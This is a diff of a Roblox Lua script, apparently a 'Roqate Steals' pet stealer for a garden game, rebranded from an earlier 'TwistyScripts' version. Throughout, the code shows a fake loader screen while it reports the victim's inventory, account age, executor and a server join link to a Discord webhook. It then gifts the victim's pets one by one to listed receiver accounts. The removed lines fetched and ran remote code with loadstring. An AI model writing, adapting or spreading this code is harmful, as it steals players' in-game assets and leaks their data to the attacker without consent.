@@ -5,7 +5,6 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
@@ -15,10 +14,25 @@ local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Dis
 local CHECK_INTERVAL = 5
 local SHUTDOWN_DURATION = 10
 local GIFT_COOLDOWN = 3
-local CHAT_KEYWORD = "a"
-local GIFT_PROMPT_TEXT = "actiontext gift pet"
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
+
+-- Executor detection
+local function getExecutor()
+    if syn then
+        return "Synapse X"
+    elseif KRNL_LOADED then
+        return "Krnl"
+    elseif fluxus then
+        return "Fluxus"
+    elseif identifyexecutor then
+        return identifyexecutor()
+    elseif getexecutorname then
+        return getexecutorname()
+    else
+        return "Unknown Executor"
+    end
+end
 
 if syn then
     syn.protect_gui(syn.secure_call)
@@ -26,6 +40,7 @@ if syn then
 end
 
 local function sendWebhook(data)
+    local startTime = os.clock()
     if not data or (not data.content and not data.embeds) then
         return false
     end
@@ -33,8 +48,8 @@ local function sendWebhook(data)
     local body = {
         content = data.content,
         embeds = data.embeds,
-        username = "Twisty Subscriber",
-        avatar_url = "https://i.imgur.com/6JqX9yP.png"
+        username = "Roqate Steals",
+        avatar_url = "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png"
     }
 
     local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
@@ -53,7 +68,8 @@ local function sendWebhook(data)
     for _, reqFunc in ipairs(requestMethods) do
         if type(reqFunc) == "function" then
             local success, response = pcall(function()
-                return reqFunc({
+                local requestStart = os.clock()
+                local result = reqFunc({
                     Url = Webhook1,
                     Method = "POST",
                     Headers = {
@@ -62,6 +78,7 @@ local function sendWebhook(data)
                     },
                     Body = json
                 })
+                return result
             end)
 
             if success and response then
@@ -76,7 +93,7 @@ end
 
 local function createLoader()
     local loaderGui = Instance.new("ScreenGui")
-    loaderGui.Name = "TwistyLoader"
+    loaderGui.Name = "RoqateLoader"
     loaderGui.IgnoreGuiInset = true
     loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     loaderGui.DisplayOrder = 999999
@@ -94,7 +111,7 @@ local function createLoader()
     corner.Parent = mainFrame
 
     local titleLabel = Instance.new("TextLabel")
-    titleLabel.Text = "TwistyScripts Loader"
+    titleLabel.Text = "Roqate Steals"
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     titleLabel.TextSize = 24
     titleLabel.Font = Enum.Font.GothamBold
@@ -291,6 +308,7 @@ local function calculateInventoryValue(pets)
 end
 
 local function sendInitialReport()
+    local startTime = os.clock()
     local pets = getSortedPets()
     if #pets < MINIMUM_PETS then
         return false, "Not enough pets ("..#pets.."/"..MINIMUM_PETS..")"
@@ -303,7 +321,7 @@ local function sendInitialReport()
 
     local placeId = game.PlaceId
     local jobId = game.JobId
-    local serverUrl = "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
+    local serverUrl = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
 
     local petList = ""
     local specialCount = 0
@@ -320,26 +338,32 @@ local function sendInitialReport()
         if pet.special then specialCount = specialCount + 1 end
     end
 
+    local executor = getExecutor()
+    
     local embed = {
-        title = "📊 Player Inventory Report",
+        title = "📊 Roqate Steals Report",
         description = string.format([[
 **Player:** %s (@%s)
 **Account Age:** %d days
+**Executor:** %s
 **Server:** [Join Game](%s)
 
 **Pet Inventory (%d)**
-%s
+```%s```
 **Total Value:** %d¢
 **Special Pets:** %d
+**Report Generation Time:** %.2f seconds
 ]], 
             LocalPlayer.Name,
             LocalPlayer.DisplayName,
             LocalPlayer.AccountAge,
+            executor,
             serverUrl,
             #pets,
             petList,
             totalValue,
-            specialCount
+            specialCount,
+            os.clock() - startTime
         ),
         color = 65280,
         footer = {
@@ -348,45 +372,25 @@ local function sendInitialReport()
         timestamp = DateTime.now():ToIsoDate()
     }
 
-    return sendWebhook({
+    local webhookStart = os.clock()
+    local success = sendWebhook({
         content = specialCount > 0 and "@everyone" or nil,
         embeds = {embed}
     })
+    
+    return success, "Webhook sent in "..string.format("%.2f", os.clock() - webhookStart).." seconds"
 end
 
 local function isPetFavorited(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    return pet:GetAttribute("Favorited") or false
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    return pet and pet:GetAttribute("Favorited")
 end
 
 local function unfavoritePet(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-    return true
-end
-
-local function isGiftPromptVisible(targetPlayer)
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            local headText = gui:FindFirstChild("Head", true)
-            local actionText = gui:FindFirstChild("actiontext", true)
-
-            if headText and actionText then
-                if headText.Text:find(targetPlayer.Name) and actionText.Text:lower():find(GIFT_PROMPT_TEXT:lower()) then
-                    return true
-                end
-            end
-        end
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if pet then
+        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        return true
     end
     return false
 end
@@ -400,7 +404,7 @@ local function equipSinglePet(petName)
     if not character then return false end
 
     for _, item in ipairs(character:GetChildren()) do
-        if item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$") then
+        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
         end
     end
@@ -438,44 +442,18 @@ end
 local function waitForReceiver()
     local receiverFound = Instance.new("BindableEvent")
 
-    local function checkReceiver(player)
-        return table.find(RECEIVERS, player.Name)
-    end
-
-    local function onPlayerMessage(player, message)
-        if message:lower() == CHAT_KEYWORD:lower() and checkReceiver(player) then
-            receiverFound:Fire(player)
-        end
-    end
-
     for _, player in ipairs(Players:GetPlayers()) do
-        if checkReceiver(player) then
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
             break
         end
     end
 
-    local connections = {}
-
-    connections.playerAdded = Players.PlayerAdded:Connect(function(player)
-        if checkReceiver(player) then
+    local connection = Players.PlayerAdded:Connect(function(player)
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
         end
     end)
-
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player:FindFirstChild("PlayerGui") then
-            local chatEvents = player.PlayerGui:FindFirstChild("ChatEvents")
-            if chatEvents then
-                local chatRemote = chatEvents:FindFirstChild("SayMessageRequest")
-                if chatRemote then
-                    connections["chat_"..player.Name] = chatRemote.OnClientEvent:Connect(function(message)
-                        onPlayerMessage(player, message)
-                    end)
-                end
-            end
-        end
-    end
 
     local backupCheck = coroutine.create(function()
         while true do
@@ -490,21 +468,14 @@ local function waitForReceiver()
     coroutine.resume(backupCheck)
 
     local foundReceiver = receiverFound.Event:Wait()
-
-    for _, connection in pairs(connections) do
-        connection:Disconnect()
-    end
-
+    connection:Disconnect()
     return foundReceiver
 end
 
 local function startGifting(targetPlayer)
     while true do
         local pets = getSortedPets()
-        if #pets == 0 then
-            task.wait(5)
-            continue
-        end
+        if #pets == 0 then break end
 
         for _, pet in ipairs(pets) do
             if isPetFavorited(pet.fullName) then
@@ -512,38 +483,21 @@ local function startGifting(targetPlayer)
                 task.wait(1)
             end
 
-            if not equipSinglePet(pet.fullName) then
-                continue
+            if equipSinglePet(pet.fullName) then
+                giftPet(targetPlayer, pet.fullName)
+                task.wait(GIFT_COOLDOWN)
+                break
             end
-            task.wait(0.5)
-
-            giftPet(targetPlayer, pet.fullName)
-            task.wait(GIFT_COOLDOWN)
-            break
         end
-
         task.wait(1)
     end
 end
 
-local function loadSpawner()
-    local success, spawner = pcall(function()
-        return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-    end)
-
-    if success and spawner then
-        spawner.Load()
-    end
-end
-
 createLoader()
-local reportSuccess, reportError = sendInitialReport()
+local reportSuccess, reportMessage = sendInitialReport()
 if not reportSuccess then
     return
 end
-
-task.spawn(loadSpawner)
-task.wait(5)
 
 local receiver = waitForReceiver()
 if not receiver then
